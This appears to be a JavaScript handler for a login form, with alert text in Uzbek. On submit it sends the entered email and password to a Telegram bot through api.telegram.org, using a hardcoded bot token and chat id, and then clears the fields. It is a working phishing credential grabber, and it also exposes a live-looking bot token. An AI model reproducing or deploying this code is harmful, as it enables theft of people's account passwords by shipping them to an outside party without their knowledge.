const Form = document.querySelector(".form")
const Email = document.querySelector("#email")
const Password = document.querySelector("#pswd")

const SendMessage = (e) => {
    e.preventDefault()

 if (Email.value === "" || Password.value === " ") {
     alert("Malumotlarni to`liq kiriting")
 } 
 else {
    text = ` %0A email : ${Email.value} %0A password : ${Password.value}`;
   chat_id = -1002128588085
   token = '6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM';
   url =` https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`
   let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        Email.value = ""  
        Password.value = ""
 }
}
Form.addEventListener("submit" , SendMessage)